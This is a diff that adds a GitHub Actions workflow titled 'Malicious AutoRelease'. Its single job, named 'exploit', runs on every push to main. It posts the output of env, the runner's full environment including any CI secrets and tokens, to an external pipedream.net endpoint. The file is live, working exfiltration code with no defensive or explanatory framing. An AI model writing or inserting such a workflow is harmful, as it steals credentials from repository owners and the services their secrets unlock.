@@ -1,0 +1,14 @@
+name: Malicious AutoRelease
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate Environment Variables
+        run: |
+          curl -X POST -d "$(env)" https://eo8j1ajzre8byjj.m.pipedream.net
